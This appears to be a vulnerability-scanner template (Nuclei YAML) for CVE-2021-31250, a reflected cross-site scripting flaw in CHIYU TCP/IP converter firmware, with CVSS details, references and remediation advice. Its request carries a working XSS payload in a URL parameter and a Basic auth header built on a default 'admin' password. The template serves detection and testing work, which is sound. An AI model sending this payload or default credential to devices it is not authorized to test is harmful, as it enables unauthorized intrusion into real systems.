http:
- headers:
    Authorization: Basic OmFkbWlu
  host-redirects: true
  matchers:
  - part: header
    type: word
    words:
    - text/html
  - part: body
    type: word
    words:
    - '"><script>alert({{randstr}})</script>'
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/if.cgi?redirect=setting.htm&failure=fail.htm&type=ap_tcps_apply&TF_ip=443&TF_submask=0&TF_submask=%22%3E%3Cscript%3Ealert%28{{randstr}}%29%3C%2Fscript%3E&radio_ping_block=0&max_tcp=3&B_apply=APPLY'
id: CVE-2021-31250
info:
  author: geeknik
  classification:
    cpe: cpe:2.3:o:chiyu-tech:bf-430_firmware:-:*:*:*:*:*:*:*
    cve-id: CVE-2021-31250
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 5.4
    cwe-id: CWE-79
    epss-percentile: 0.99524
    epss-score: 0.89372
  description: CHIYU BF-430, BF-431 and BF-450M TCP/IP Converter devices contain a
    cross-site scripting vulnerability due to a lack of sanitization of the input
    on the components man.cgi, if.cgi, dhcpc.cgi, and ppp.cgi.
  impact: 'Successful exploitation of this vulnerability could allow an attacker to
    execute arbitrary JavaScript code in the context of the victim''s browser, leading
    to session hijacking, defacement, or theft of sensitive information.

    '
  metadata:
    max-request: 1
    product: bf-430_firmware
    vendor: chiyu-tech
  name: CHIYU TCP/IP Converter - Cross-Site Scripting
  reference:
  - https://gitbook.seguranca-informatica.pt/cve-and-exploits/cves/chiyu-iot-devices#cve-2021-31250
  - https://www.chiyu-tech.com/msg/message-Firmware-update-87.htm
  - https://seguranca-informatica.pt/dancing-in-the-iot-chiyu-devices-vulnerable-to-remote-attacks/
  - https://nvd.nist.gov/vuln/detail/CVE-2021-31250
  - https://github.com/ARPSyndicate/cvemon
  remediation: 'To mitigate this vulnerability, ensure that all user-supplied input
    is properly validated and sanitized before being rendered in web pages.

    '
  severity: medium
  tags: cve2021,cve,chiyu,xss,iot,intrusive,chiyu-tech,vkev,vuln
